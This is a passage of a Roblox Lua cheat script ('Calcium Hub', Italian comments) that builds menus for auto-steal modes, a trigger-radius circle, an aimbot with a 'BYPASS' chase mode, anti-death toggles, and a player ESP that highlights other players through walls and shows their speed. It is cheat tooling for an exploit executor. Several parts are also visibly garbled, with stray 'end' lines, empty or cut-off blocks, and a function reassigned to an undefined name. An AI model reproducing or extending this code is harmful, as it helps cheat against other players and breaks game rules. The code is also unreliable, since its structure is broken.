  end
  n1Click.MouseButton1Click:Connect(function() setN("V1") end)
  n2Click.MouseButton1Click:Connect(function() setN("V2") end)
  setN(selectedNormalMode or "V1")
  _G.CalciumSetNormalSubMode = setN

  local _oldRefresh = _G.CalciumRefreshSemiStealRows
  _G.CalciumRefreshSemiStealRows = function()
    if _oldRefresh then pcall(_oldRefresh) end
    if nvHolder then nvHolder.Visible = (selectedStealMode == "Normal") end
    if _G.CalciumSemiSubHolder then _G.CalciumSemiSubHolder.Visible = (selectedStealMode == "Semi") end
  end
end)()

-- ===== SEMI SUB-MODE SELECTOR (V1 / V2 / V3) — visibile solo in modalità Semi =====
;(function()
  -- Costruiamo il row slider SEMI V1 / SEMI V2 / SEMI V3 identico allo stile di autoStealSelectorRow
  local semiSubHolder = Instance.new("Frame")
  semiSubHolder.Name = "Semi Sub Mode"
  semiSubHolder.BackgroundColor3 = COLORS.row
  semiSubHolder.BackgroundTransparency = 0.28
  semiSubHolder.Size = UDim2.new(1, -4, 0, 46)
  semiSubHolder.BorderSizePixel = 0
  semiSubHolder.LayoutOrder = 2.5
  semiSubHolder.ZIndex = 4
  semiSubHolder.ClipsDescendants = true
  semiSubHolder.Visible = selectedStealMode == "Semi"
  semiSubHolder.Parent = Combat
  _G.CalciumSemiSubHolder = semiSubHolder
  corner(semiSubHolder, 14)
  stroke(semiSubHolder, Color3.fromRGB(200, 85, 25), 1.4, 0.32)
  _G._CalciumRegAccent(semiSubHolder, nil, "soft")

  local subSlide = Instance.new("Frame")
  subSlide.Name = "SelectedSlide"
  subSlide.BackgroundColor3 = Color3.fromRGB(255, 120, 30)
  subSlide.BackgroundTransparency = 0.1
  subSlide.Size = UDim2.new(1/3, -3, 1, -8)
  subSlide.Position = UDim2.new(0, 4, 0, 4)
  subSlide.BorderSizePixel = 0
  subSlide.ZIndex = 5
  subSlide.Parent = semiSubHolder
  corner(subSlide, 13)
  local subSlideStroke = Instance.new("UIStroke")
  subSlideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  subSlideStroke.Color = Color3.fromRGB(255, 175, 90)
  subSlideStroke.Thickness = 1.5
  subSlideStroke.Transparency = 0.1
  subSlideStroke.Parent = subSlide
  local subSlideGradient = Instance.new("UIGradient")
  subSlideGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(202, 148, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(101, 31, 190)),
  })
  subSlideGradient.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.08),
    NumberSequenceKeypoint.new(0.5, 0.02),
    NumberSequenceKeypoint.new(1, 0.08),
  })
  subSlideGradient.Parent = subSlide
  _G._CalciumRegAccent(subSlide, subSlideGradient, "slide")
  subSlideGradient.Rotation = 22

  local SEMI_MODES = {"V1", "V2", "V3"}
  local semiSegW = 1 / #SEMI_MODES
  local semiTexts = {}

  for i, m in ipairs(SEMI_MODES) do
    local lbl = Instance.new("TextLabel")
    lbl.Name = m .. "Text"
    lbl.BackgroundTransparency = 1
    lbl.Text = "SEMI " .. m
    lbl.TextColor3 = COLORS.white
    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    lbl.TextStrokeTransparency = 0.2
    lbl.TextSize = 11
    lbl.TextScaled = true
    local _tsc = Instance.new("UITextSizeConstraint"); _tsc.MaxTextSize = 12; _tsc.MinTextSize = 8; _tsc.Parent = lbl
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Center
    lbl.Size = UDim2.new(semiSegW, 0, 1, 0)
    lbl.Position = UDim2.new(semiSegW * (i - 1), 0, 0, 0)
    lbl.ZIndex = 8
    lbl.Parent = semiSubHolder
    semiTexts[i] = lbl

    local click = Instance.new("TextButton")
    click.Name = m .. "Click"
    click.BackgroundTransparency = 1
    click.Text = ""
    click.AutoButtonColor = false
    click.Size = UDim2.new(semiSegW, 0, 1, 0)
    click.Position = UDim2.new(semiSegW * (i - 1), 0, 0, 0)
    click.ZIndex = 10
    click.Parent = semiSubHolder
    local _m = m
    click.MouseButton1Click:Connect(function()
      if _G.CalciumSetSemiSubMode then _G.CalciumSetSemiSubMode(_m) end
    end)
  end
  local function semiIndexOf(mode)
    for i, m in ipairs(SEMI_MODES) do
      if m == mode then return i end
    end
    return 1
  end
  -- Durata fissa come gli altri slider dell'hub: piu' e' lontano il
  -- segmento, piu' veloce si muove la slide.
  local function applySemiSubVisual(mode)
    local idx = semiIndexOf(mode)
    tween(subSlide, {
      Position = UDim2.new(semiSegW * (idx - 1), (idx == 1) and 4 or -1, 0, 4),
      Size = UDim2.new(semiSegW, -3, 1, -8),
    }, 0.18)
    for i, lbl in ipairs(semiTexts) do
      local sel = (i == idx)
      tween(lbl, {
        TextTransparency = sel and 0 or 0.5,
        TextStrokeTransparency = sel and 0.2 or 0.38
      }, 0.14)
    end
  end
  -- V1 e V3 usano lo stesso motore, quindi condividono anche il Radius
  -- (slot "Semi"). Solo la V2 ha il suo SemiV2Radius.
  local function applySemiRadiusBox()
    if selectedSemiMode == "V2" then
      if autoStealRadiusBox then
        autoStealRadiusBox.Text = tostring((_G.CalciumStealRadii and _G.CalciumStealRadii.SemiV2Radius) or 60)
      end
    else
      autoStealRadius = (_G.CalciumStealRadii and _G.CalciumStealRadii.Semi) or 60
      if autoStealRadiusBox then
        autoStealRadiusBox.Text = tostring(autoStealRadius)
      end
    end
  end
  local function setSemiSubModeVisualOnly(mode)
    if mode ~= "V2" and mode ~= "V3" then mode = "V1" end
    selectedSemiMode = mode
    pcall(function() if _G.playClick then _G.playClick() end end)
    applySemiSubVisual(selectedSemiMode)
    applySemiRadiusBox()
    if _G.CalciumRefreshSemiStealRows then _G.CalciumRefreshSemiStealRows() end
  end
  local function setSemiSubMode(mode)
    setSemiSubModeVisualOnly(mode)
    task.spawn(function()
      saveCalciumConfig()
      if _G.CalciumAutoStealSync then _G.CalciumAutoStealSync() end
    end)
  end
  setSemiSubModeVisualOnly(selectedSemiMode)

  _G.CalciumSemiSubHolder = semiSubHolder
  _G.CalciumSetSemiSubMode = setSemiSubMode
  _G.CalciumSetSemiSubModeVisual = setSemiSubModeVisualOnly
end)()

-- ===== SEMI STEAL SETTINGS (visibili solo in modalità Semi) =====
;(function()
  local A = _G.CalciumSemiSteal

  local function getSemi(key, def)
    return A and A[key] or def
  end
  local function setSemi(key, val)
    if A then A[key] = val end
  end
  -- Delay Radius (4.1) — raggio entro cui scatta il trigger nella fase 2 (Semi V1)
  local _, delayRadBox = textboxRow(Combat, "Delay Radius", tostring(getSemi("autoGrabSetDelayRadius", 8)), 4.1)
  _G.CalciumDelayRadBox = delayRadBox
  delayRadBox.FocusLost:Connect(function()
    local v = tonumber(delayRadBox.Text)
    if v and v > 0 and v <= 500 then
      setSemi("autoGrabSetDelayRadius", v)
    end
    delayRadBox.Text = tostring(getSemi("autoGrabSetDelayRadius", 8))
    saveCalciumConfig()
  end)

  -- Stop Time (4.2) — barra si ferma qui prima di aspettare il raggio (Semi V1)
  local _, stopTimeBox = textboxRow(Combat, "Stop Time (s)", tostring(getSemi("autoGrabStopTime", 1.29)), 4.2)
  _G.CalciumStopTimeBox = stopTimeBox
  stopTimeBox.FocusLost:Connect(function()
    local v = tonumber(stopTimeBox.Text)
    -- Tetto a 1.29s: oltre, la barra resterebbe ferma a 100% e il trigger
    -- diventerebbe istantaneo, che non e' il comportamento voluto per la V1.
    if v and v > 0 and v <= 1.29 then
      setSemi("autoGrabStopTime", v)
    end
    stopTimeBox.Text = tostring(getSemi("autoGrabStopTime", 1.29))
    saveCalciumConfig()
  end)

  -- Stop Time % (4.25) — come sopra ma espresso in percentuale di riempimento
  -- della barra (Semi V3). Il motore e' lo stesso della V1: la percentuale
  -- viene convertita in secondi dentro executeSemi.
  local _, stopPctBox = textboxRow(Combat, "Stop Time (%)", tostring(getSemi("autoGrabStopPercent", 75)), 4.25)
  _G.CalciumStopPctBox = stopPctBox
  stopPctBox.FocusLost:Connect(function()
    local v = tonumber(stopPctBox.Text)
    if v and v > 0 and v <= 100 then
      setSemi("autoGrabStopPercent", v)
    end
    stopPctBox.Text = tostring(getSemi("autoGrabStopPercent", 75))
    saveCalciumConfig()
  end)

  -- Semi Radius (4.15) — steal range per Semi V2 (= STEAL_RANGE nel vecchio CONFIG)
  local semiV2RadDefault = tostring(tonumber(_G.CalciumStealRadii and _G.CalciumStealRadii.SemiV2SemiRadius) or 8)
  local _, semiV2RadBox = textboxRow(Combat, "Semi Radius", semiV2RadDefault, 4.15)
  _G.CalciumSemiV2RadBox = semiV2RadBox
  semiV2RadBox.FocusLost:Connect(function()
    local v = tonumber(semiV2RadBox.Text)
    if v and v > 0 and v <= 500 then
      _G.CalciumStealRadii = _G.CalciumStealRadii or {}
      _G.CalciumStealRadii.SemiV2SemiRadius = v
      if _G.CalciumSemiV2SetSemiRadius then _G.CalciumSemiV2SetSemiRadius(v) end
    end
    semiV2RadBox.Text = tostring((_G.CalciumStealRadii and _G.CalciumStealRadii.SemiV2SemiRadius) or 8)
    saveCalciumConfig()
  end)

  -- >>> RADIUS CIRCLE BEGIN
  -- Toggle "Radius Circle": disegna un cerchio viola alla base dei piedi
  -- con il raggio che conta davvero nella modalita' selezionata:
  --   Semi V1 / V3 -> Delay Radius
  --   Semi V2      -> Semi Radius
  -- Serve a capire a occhio quando si e' dentro il raggio di trigger.
  local rcPart = nil
  local rcConn = nil

  local function rcRadius()
    if selectedSemiMode == "V2" then
      return tonumber(_G.CalciumStealRadii and _G.CalciumStealRadii.SemiV2SemiRadius) or 8
    end
    return tonumber(getSemi("autoGrabSetDelayRadius", 8)) or 8
  end
  local function rcDestroy()
    if rcConn then pcall(function() rcConn:Disconnect() end); rcConn = nil end
    if rcPart then pcall(function() rcPart:Destroy() end); rcPart = nil end
  end
  -- Le versioni precedenti creavano anche un secondo disco ("...Rim")
  -- appeso alla camera. Rieseguendo lo script quello restava li' e si
  -- vedeva ancora l'anello: qui si spazza via qualunque residuo.
  local function rcClearStray()
    local cam = workspace.CurrentCamera
    if not cam then return end
    for _, o in ipairs(cam:GetChildren()) do
      if o ~= rcPart and typeof(o) == "Instance"
         and string.sub(o.Name, 1, 20) == "CalciumRadiusCircl" then
        pcall(function() o:Destroy() end)
      end
    end
  end
  local function rcEnsurePart()
    if rcPart and rcPart.Parent then return rcPart end
    rcClearStray()
    local p = Instance.new("Part")
    p.Name = "CalciumRadiusCircle"
    p.Shape = Enum.PartType.Cylinder
    p.Anchored = true
    p.CanCollide = false
    p.CanQuery = false
    p.CanTouch = false
    p.CastShadow = false
    p.Massless = true
    p.Material = Enum.Material.Neon
    p.Color = _G.CalciumRadiusCircleColor or Color3.fromRGB(230, 230, 230)
    p.Transparency = 0.72
    p.Size = Vector3.new(0.12, 2, 2)
    -- Parent alla camera: resta puramente locale e fuori dai query di workspace.
    p.Parent = workspace.CurrentCamera
    rcPart = p
    return p
  end
  local function rcStep()
    if not (_G.CalciumRadiusCircleEnabled == true) then rcDestroy() return end
    -- Solo in modalita' Semi: fuori di li' il raggio non vuol dire niente.
    if selectedStealMode ~= "Semi" then
      if rcPart then rcPart.Transparency = 1 end
      return
    end
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp then
      if rcPart then rcPart.Transparency = 1 end
      return
    end
    local p = rcEnsurePart()
    p.Transparency = 0.72
    local d = math.clamp(rcRadius(), 0.5, 500) * 2
    p.Size = Vector3.new(0.12, d, d)

    -- Quota: dai piedi del personaggio, come in origine.
    local footY = hrp.Position.Y - (hrp.Size.Y * 0.5) - ((hum and hum.HipHeight) or 2)

    -- Atterrando il personaggio schiaccia e rimbalza di qualche centesimo:
    -- con un margine minimo dal suolo il disco ci finiva sotto per un frame
    -- e sembrava sparire. Si smorzano SOLO gli sbalzi piccoli (sotto 1.5
    -- stud, cioe' il rimbalzo); salti e dislivelli veri restano istantanei.
    local prev = _G._AmbRCLastY
    if prev and math.abs(footY - prev) < 1.5 then
      footY = prev + (footY - prev) * 0.4
    end
    _G._AmbRCLastY = footY

    -- Cylinder e' orientato lungo X: lo si ruota per appoggiarlo a terra.
    p.CFrame = CFrame.new(hrp.Position.X, footY + 0.2, hrp.Position.Z)
              * CFrame.Angles(0, 0, math.rad(90))
  end
  local function rcSetEnabled(on)
    _G.CalciumRadiusCircleEnabled = on and true or false
    if _G.CalciumRadiusCircleEnabled then
      if not rcConn then
        rcConn = RunService.RenderStepped:Connect(function()
          local ok = pcall(rcStep)
          if not ok and rcPart then rcPart.Transparency = 1 end
        end)
      end
    else
      rcDestroy()
    end
  end
  _G.CalciumSetRadiusCircle = function() _G.CalciumRadiusCircleEnabled = false; pcall(rcDestroy) end -- disabled
  _G.CalciumSetRadiusCircle = rcSetEnabled_UNUSED

  -- Colore del cerchio: applicato subito anche se e' gia' a schermo.
  _G.CalciumSetRadiusCircleColor = function(c)
    if typeof(c) ~= "Color3" then return end
    _G.CalciumRadiusCircleColor = c
    if rcPart and rcPart.Parent then
      pcall(function() rcPart.Color = c end)
    end
  end
  -- La riga viene costruita DOPO il Synchronize After Hit (che nasce piu'
  -- in basso nel file): a parita' di LayoutOrder vince l'ordine di
  -- creazione, quindi cosi' finisce esattamente sotto di esso.
  local rcRow, rcColorRow = nil, nil
  _G._CalciumBuildRadiusCircleRow = function(order)
    if rcRow then return rcRow end
    local row, rcSetVisual = toggleRow(Combat, "Radius Circle", false, order or 3)
    if row then row.Visible = false; row.Size = UDim2.new(1,-4,0,0) end
    _G.CalciumRadiusCircleEnabled = false
    pcall(function()
      for _, g in ipairs({Combat, pages and pages.COMBAT}) do
        if g then
          for _, ch in ipairs(g:GetDescendants()) do
            if ch.Name and tostring(ch.Name):lower():find("radius") then
              ch.Visible = false
              if ch:IsA("GuiObject") then ch.Size = UDim2.new(1,-4,0,0) end
            end
          end
        end
      end
    end)
    rcRow = row
    _G.CalciumRadiusCircleSetVisual = rcSetVisual
    local rcBtn = row and row:FindFirstChild("ToggleButton")
    if rcBtn then
      _G.CalciumWireToggle(rcBtn, function() local on = not (_G.CalciumRadiusCircleEnabled == true)
        rcSetEnabled(on)
        if rcSetVisual then rcSetVisual(on) end
        saveCalciumConfig() end)
    end
    -- Tendina del colore, identica a quella del Tracker Color
    local colorRow, setRcPreview = _G._CalciumBuildColorPickerRow({
      parent    = Combat,
      anchorRow = row,
      rowName   = "Radius Circle Color",
      rowOrder  = order or 3,
      title     = "RADIUS CIRCLE COLOR",
      getColor  = function()
        return _G.CalciumRadiusCircleColor or Color3.fromRGB(230, 230, 230)
      end,
      onColor   = function(c)
        if _G.CalciumSetRadiusCircleColor then _G.CalciumSetRadiusCircleColor(c) end
        saveCalciumConfig()
      end,
    })
    rcColorRow = colorRow
    _G.CalciumRadiusCircleSetColorPreview = setRcPreview

    -- Allinea subito la visibilita' delle righe alla modalita' corrente
    if _G.CalciumRefreshSemiStealRows then _G.CalciumRefreshSemiStealRows() end
    return row

  _G.CalciumRadiusCircleEnabled = false

  local cam = workspace.CurrentCamera
  if cam then

    end

    if p then

        local n = tostring(d.Name or ""):lower()
        if n:find("radius circle") or n:find("radiuscircle") then
          pcall(function()

          end)
        end
      end
    end
  end
end)


  -- Funzione per mostrare/nascondere le righe in base alla modalità
  local function refreshSemiRowsVisibility()
    local onSemi = selectedStealMode == "Semi"
    local onNormal = selectedStealMode == "Normal"
    local onV2   = onSemi and selectedSemiMode == "V2"
    local onV3   = onSemi and selectedSemiMode == "V3"
    local onV1   = onSemi and not onV2 and not onV3

    -- NORMAL V1/V2 only when Normal is selected
    if _G.CalciumNormalSubHolder then
      _G.CalciumNormalSubHolder.Visible = onNormal
    end
    -- slider SEMI V1/V2/V3 only when Semi is selected
    if _G.CalciumSemiSubHolder then
      _G.CalciumSemiSubHolder.Visible = onSemi
    end
    -- Delay Radius: usato sia dalla V1 che dalla V3 (stesso motore)
    if delayRadBox and delayRadBox.Parent then delayRadBox.Parent.Visible = onV1 or onV3 end

    -- Stop Time in secondi: solo V1
    if stopTimeBox and stopTimeBox.Parent then stopTimeBox.Parent.Visible = onV1 end

    -- Stop Time in percentuale: solo V3
    if stopPctBox and stopPctBox.Parent then stopPctBox.Parent.Visible = onV3 end

    -- riga Semi V2
    if semiV2RadBox and semiV2RadBox.Parent then semiV2RadBox.Parent.Visible = onV2 end

    -- >>> RADIUS CIRCLE: le righe vivono solo in modalita' Semi <<<
    if rcRow then rcRow.Visible = false end
    if rcColorRow then rcColorRow.Visible = false end

    -- aggiorna i valori quando si torna nei rispettivi tab
    if A then
      if onV1 then
        stopTimeBox.Text = tostring(A.autoGrabStopTime or 1.29)
      end
      if onV3 then
        stopPctBox.Text = tostring(A.autoGrabStopPercent or 75)
      end
      if onV1 or onV3 then
        delayRadBox.Text = tostring(A.autoGrabSetDelayRadius or 8)
      end
    end
    if onV2 then
      semiV2RadBox.Text = tostring((_G.CalciumStealRadii and _G.CalciumStealRadii.SemiV2SemiRadius) or 8)
    end
  end
  -- Mostra subito lo stato corretto
  refreshSemiRowsVisibility()

  -- Espone la funzione per essere chiamata dal mode switcher (Normal/Semi slider e V1/V2/V3 slider)
  _G.CalciumRefreshSemiStealRows = refreshSemiRowsVisibility
end)()

-- Selettore NORMAL / BYPASS per l'inseguimento di un aimbot.
-- key = "V1" oppure "V2". Cambia solo la logica di chase.
_G._CalciumBuildAimbotChaseSelector = function(parent, key, titleText, order)
  local holder = Instance.new("Frame")
  holder.Name = "Aimbot Chase " .. key
  holder.BackgroundColor3 = COLORS.row
  holder.BackgroundTransparency = 0.28
  holder.Size = UDim2.new(1, -4, 0, 46)
  holder.BorderSizePixel = 0
  holder.LayoutOrder = order
  holder.ZIndex = 4
  holder.ClipsDescendants = true
  holder.Visible = (selectedAimbotMode == key)
  holder.Parent = parent
  corner(holder, 14)
  stroke(holder, Color3.fromRGB(200, 85, 25), 1.4, 0.32)
  _G._CalciumRegAccent(holder, nil, "soft")

  local slide = Instance.new("Frame")
  slide.Name = "SelectedSlide"
  slide.BackgroundColor3 = Color3.fromRGB(255, 120, 30)
  slide.BackgroundTransparency = 0.1
  slide.Size = UDim2.new(0.5, -3, 1, -8)
  slide.Position = UDim2.new(0, 4, 0, 4)
  slide.BorderSizePixel = 0
  slide.ZIndex = 5
  slide.Parent = holder
  corner(slide, 13)
  local slideStroke = Instance.new("UIStroke")
  slideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  slideStroke.Color = Color3.fromRGB(255, 140, 45)
  slideStroke.Thickness = 1.5
  slideStroke.Transparency = 0.1
  slideStroke.Parent = slide
  local slideGrad = Instance.new("UIGradient")
  slideGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(202, 148, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(101, 31, 190)),
  })
  slideGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.08),
    NumberSequenceKeypoint.new(0.5, 0.02),
    NumberSequenceKeypoint.new(1, 0.08),
  })
  slideGrad.Rotation = 22
  slideGrad.Parent = slide
  _G._CalciumRegAccent(slide, slideGrad, "slide")

  local function mkText(txt, xScale)
    local t = Instance.new("TextLabel")
    t.BackgroundTransparency = 1
    t.Text = txt
    t.TextColor3 = COLORS.white
    t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    t.TextStrokeTransparency = 0.2
    t.TextSize = 11
    t.Font = Enum.Font.GothamBold
    t.TextXAlignment = Enum.TextXAlignment.Center
    t.Size = UDim2.new(0.5, 0, 1, 0)
    t.Position = UDim2.new(xScale, 0, 0, 0)
    t.ZIndex = 8
    t.Parent = holder
    return t
  end
  local function mkClick(xScale)
    local b = Instance.new("TextButton")
    b.BackgroundTransparency = 1
    b.Text = ""
    b.AutoButtonColor = false
    b.Size = UDim2.new(0.5, 0, 1, 0)
    b.Position = UDim2.new(xScale, 0, 0, 0)
    b.ZIndex = 10
    b.Parent = holder
    return b
  end
  local normalText = mkText("NORMAL", 0)
  local bypassText = mkText("BYPASS", 0.5)
  local normalClick = mkClick(0)
  local bypassClick = mkClick(0.5)

  local function applyVisual(mode)
    local isBypass = (mode == "BYPASS")
    tween(slide, {
      Position = isBypass and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
    }, 0.18)
    tween(normalText, {
      TextTransparency = isBypass and 0.5 or 0,
      TextStrokeTransparency = isBypass and 0.38 or 0.2
    }, 0.14)
    tween(bypassText, {
      TextTransparency = isBypass and 0 or 0.5,
      TextStrokeTransparency = isBypass and 0.2 or 0.38
    }, 0.14)
  end
  local function setMode(mode)
    if mode ~= "BYPASS" then mode = "NORMAL" end
    _G._CalciumAimbotChase = _G._CalciumAimbotChase or { V1 = "NORMAL", V2 = "NORMAL" }
    _G._CalciumAimbotChase[key] = mode
    applyVisual(mode)
    saveCalciumConfig()
  end
  normalClick.MouseButton1Click:Connect(function() setMode("NORMAL") end)
  bypassClick.MouseButton1Click:Connect(function() setMode("BYPASS") end)

  _G["_CalciumAimbotChaseHolder" .. key] = holder
  _G["_CalciumRefreshAimbotChase" .. key] = function()
    applyVisual((_G._CalciumAimbotChase and _G._CalciumAimbotChase[key]) or "NORMAL")
  end
  applyVisual((_G._CalciumAimbotChase and _G._CalciumAimbotChase[key]) or "NORMAL")
  return holder
end

do
  local _avRow, setAntiVoidVisual = toggleRow(Combat, "Anti Void", _G.CalciumAntiVoidEnabled == true, 14)
  local _adRow, setAntiDieVisual = toggleRow(Combat, "Anti Die", antiDieEnabled == true or _G._CalciumAntiDieUserWanted == true, 16)
  _SV.setAntiDieVisual = setAntiDieVisual
  local _adBtn = _adRow and _adRow:FindFirstChild("ToggleButton")
  if _adBtn then
    _G.CalciumWireToggle(_adBtn, function()
      local wanted = _G._CalciumAntiDieUserWanted == true
      if not wanted and _G._CalciumAntiDieAutoOn == true and antiDieEnabled then
        -- Adopt automatically-armed protection as an explicitly saved preference.
        _G._CalciumAntiDieAutoOn = false
        _G._CalciumAntiDieUserWanted = true
        setAntiDieVisual(true)
        saveCalciumConfig()
        return
      end
      if wanted and _G.CalciumAntiDieLocked and _G.CalciumAntiDieLocked() then
        setAntiDieVisual(true)
        return
      end
      local changed = setAntiDie(not wanted)
      setAntiDieVisual(antiDieEnabled == true)
      if changed ~= false then saveCalciumConfig() end
    end)
  end

  _SV.setAntiVoidVisual = setAntiVoidVisual
  local _avBtn = _avRow and _avRow:FindFirstChild("ToggleButton")
  if _avBtn then
    _G.CalciumWireToggle(_avBtn, function() local on = not (_G.CalciumAntiVoidEnabled == true)
      if _G.CalciumAntiVoid then _G.CalciumAntiVoid.setEnabled(on) end
      if setAntiVoidVisual then setAntiVoidVisual(on) end
      saveCalciumConfig() end)
  end
end

      saveCalciumConfig() end)
  end
  local batRow = Combat:FindFirstChild("Bat Counter")
  if batRow then
    _G._CalciumBuildBatCounterModeSelector(batRow, Combat)
  end
end

  PlayerESP = PlayerESP or {enabled=false, playerData={}, conns={}, discordText="discord.gg/calciumhub"}
  BoxedESPOptions = BoxedESPOptions or {box=false, tracker=false, trackerColor=Color3.fromRGB(230,230,230)}
  BoxedESPData = BoxedESPData or {}
  BoxedESPConn = BoxedESPConn or nil
  stretchRezConn = stretchRezConn or nil
  antiLagDescConn = antiLagDescConn or nil
  noCamCollisionConn = noCamCollisionConn or nil
  noCamCollisionParts = noCamCollisionParts or {}
  _calciumCustomFontOrig = _calciumCustomFontOrig or {}
  _calciumCustomFontConn = _calciumCustomFontConn or nil
  _calciumCustomFont = _calciumCustomFont or nil

function startPlayerESP()
    if PlayerESP.enabled then return end
    PlayerESP.enabled = true

    function cleanup(plr)
        local d = PlayerESP.playerData[plr]; if not d then return end
        pcall(function() if d.highlight then d.highlight:Destroy() end end)
        pcall(function() if d.billboard then d.billboard:Destroy() end end)
        if d.conns then for _,c in ipairs(d.conns) do pcall(function() c:Disconnect() end) end end
        PlayerESP.playerData[plr] = nil
    end
    function setup(plr, char)
        if not PlayerESP.enabled or plr == LP then return end
        cleanup(plr)
        local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart",5))
        local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head",5))
        if not hrp or not head then return end

        local hl = Instance.new("Highlight")
        hl.Name = "CalciumHubESP"; hl.Adornee = char; hl.FillColor = Color3.fromRGB(35,35,35); hl.FillTransparency = 0.72
        hl.OutlineColor = Color3.fromRGB(245,245,245); hl.OutlineTransparency = 0; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop; hl.Parent = char

        local bb = Instance.new("BillboardGui")
        bb.Name = "CalciumHubESPTag"; bb.Adornee = head; bb.Size = UDim2.new(0,124,0,34); bb.StudsOffset = Vector3.new(0,2.7,0); bb.AlwaysOnTop = true; bb.LightInfluence = 0; bb.Parent = head

        local box = Instance.new("Frame", bb); box.Size = UDim2.new(1,0,1,0); box.BackgroundTransparency = 1; box.BorderSizePixel = 0
        Instance.new("UICorner", box).CornerRadius = UDim.new(0,9)

        -- Label velocità (dimensione più grande)
        local n = Instance.new("TextLabel", box)
        n.Size = UDim2.new(1,-10,0,17)
        n.Position = UDim2.new(0,5,0,2)
        n.BackgroundTransparency = 1
        n.TextColor3 = Color3.fromRGB(255,255,255)
        n.Font = Enum.Font.GothamBold
        n.TextSize = 22
        n.TextStrokeTransparency = 0.38

        -- GRADIENTE GALATTICO PER LA VELOCITÀ DEL NEMICO
        local speedGrad = Instance.new("UIGradient", n)
        speedGrad.Rotation = 0
        speedGrad.Transparency = NumberSequence.new(0)
        speedGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 140, 45)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(230, 100, 25)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(90, 30, 8)),
        })

        local calciumLbl = Instance.new("TextLabel", box)
        calciumLbl.Name = "UsingCalciumLbl"
        calciumLbl.Size = UDim2.new(1,-8,0,12)
        calciumLbl.Position = UDim2.new(0,4,0,20)
        calciumLbl.BackgroundTransparency = 1
        calciumLbl.Font = Enum.Font.GothamBold
        calciumLbl.TextSize = 11
        calciumLbl.TextColor3 = Color3.fromRGB(80, 255, 160)
        calciumLbl.TextStrokeTransparency = 0.5
        calciumLbl.Text = ""
        calciumLbl.Visible = false
        bb.Size = UDim2.new(0, 140, 0, 42)

        local conn = RunService.Heartbeat:Connect(function()
            if not PlayerESP.enabled or not hrp.Parent then return end
            local v = hrp.AssemblyLinearVelocity or hrp.Velocity
            n.Text = string.format("%d speed", math.floor(Vector3.new(v.X,0,v.Z).Magnitude+0.5))
            local using = false
            pcall(function()
              local ch = plr.Character
              if ch and (ch:GetAttribute("UsingCalcium") == true or ch:GetAttribute("CalciumHubUser") == true) then
                using = true
              end
            end)
            if using then
              calciumLbl.Text = "USING CALCIUM"
              calciumLbl.Visible = true
            else
              calciumLbl.Text = ""
              calciumLbl.Visible = false
            end
        end)

        PlayerESP.playerData[plr] = {highlight = hl, billboard = bb, conns = {conn}}
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP then
            if plr.Character then setup(plr, plr.Character) end
            table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setup, plr, c) end))
        end
    end
    table.insert(PlayerESP.conns, Players.PlayerAdded:Connect(function(plr)
        if plr ~= LP then
            table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setup, plr, c) end))
        end
    end))
    table.insert(PlayerESP.conns, Players.PlayerRemoving:Connect(cleanup))
end
  function stopPlayerESP()
    PlayerESP.enabled = false
    for _, c in ipairs(PlayerESP.conns or {}) do pcall(function() c:Disconnect() end) end
    PlayerESP.conns = {}
    for plr, d in pairs(PlayerESP.playerData or {}) do
      pcall(function() if d.highlight then d.highlight:Destroy() end end)
      pcall(function() if d.billboard then d.billboard:Destroy() end end)
      -- La Heartbeat che aggiorna la velocita' del nemico va chiusa qui,
      -- altrimenti resta viva a girare a vuoto e se ne accumula una per
      -- giocatore ad ogni spegnimento.
      if d.conns then
        for _, c in ipairs(d.conns) do pcall(function() c:Disconnect() end) end
      end
    end
    PlayerESP.playerData = {}
  end
  function _calciumEspColor()
    if BoxedESPOptions and BoxedESPOptions.trackerColor then
      return BoxedESPOptions.trackerColor
    end
    return THEME_ACCENT or Color3.fromRGB(230,230,230)
  end
  function _safeDrawing(kind, props)
    if not Drawing or not Drawing.new then return nil end
    local ok, obj = pcall(function() return Drawing.new(kind) end)
    if not ok or not obj then return nil end
    for k, v in pairs(props or {}) do pcall(function() obj[k] = v end) end
    return obj
  end
  function _cleanupBoxedESPPlayer(player)
    local data = BoxedESPData[player]
    if not data then return end
    for _, obj in pairs(data) do
      pcall(function()
        obj.Visible = false
        if obj.Remove then obj:Remove() end
      end)
    end
    BoxedESPData[player] = nil
  end
  function _cleanupBoxedESP()
    for player, _ in pairs(BoxedESPData) do _cleanupBoxedESPPlayer(player) end
  end
  local function getEdgePoint(cam, targetWorldPos)
    local view = cam.ViewportSize
    local center = Vector2.new(view.X / 2, view.Y / 2)

    local targetScreen = cam:WorldToViewportPoint(targetWorldPos)
    local targetV2 = Vector2.new(targetScreen.X, targetScreen.Y)

    if targetScreen.Z > 0 then
      local margin = 50
      if targetV2.X >= -margin and targetV2.X <= view.X + margin
         and targetV2.Y >= -margin and targetV2.Y <= view.Y + margin then
        return targetV2
      end
    end
    local dir = targetV2 - center

    if targetScreen.Z <= 0 then
